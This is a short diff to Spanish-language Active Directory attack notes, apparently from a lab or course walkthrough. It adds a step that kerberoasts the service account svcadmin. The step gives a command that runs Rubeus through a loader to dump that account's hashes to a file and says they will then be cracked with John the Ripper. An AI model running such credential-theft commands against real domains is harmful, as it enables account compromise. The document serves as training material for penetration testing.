@@ -1147,4 +1147,9 @@ Y buscaremos los servicios que se están ejecutando con cuentas de usuario
 Get-DomainUser -SPN
 ```
 
-Encontramos que el usuario *svcadmin*
+Encontramos que el usuario *svcadmin* tiene varios SPN asociados a el
+Con *Rubeus* y *John the Ripper* obtendremos los hashes y los crakearemos, lo haremos sobre la cuenta *svcadmin*
+```shell
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
+```
+
